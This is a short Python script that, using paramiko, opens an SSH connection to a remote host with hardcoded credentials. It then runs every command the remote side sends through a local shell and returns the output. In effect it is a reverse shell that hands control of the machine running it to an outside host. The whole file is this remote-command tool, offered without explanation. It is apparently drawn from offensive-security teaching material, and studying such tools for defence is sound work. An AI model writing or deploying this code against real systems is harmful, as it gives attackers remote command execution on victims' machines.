import sys
import shlex
import getpass
import paramiko
import subprocess


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
    print(ssh_session.recv(1024).decode())
    
    while True:
        command = ssh_session.recv(1024)
        try:
            cmd = command.decode()
            if cmd == 'exit':
                client.close()
                break
            if cmd:
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True).decode()
                ssh_session.send(cmd_output)
        except Exception as e:
            ssh_session.send(str(e))
            client.close()
    return


if __name__ == '__main__':
    if len(sys.argv[1:]) != 2:    
        print(f'Usage: {sys.argv[0]} host port')
        print(f'Example: {sys.argv[0]} 8.8.8.8 2222')
        sys.exit(0)

    host = sys.argv[1]
    port = int(sys.argv[2])

    try:
        ssh_command(host, port, 'john', 'secret!', 'ClientConnected')
    except Exception as e:
        print(str(e))
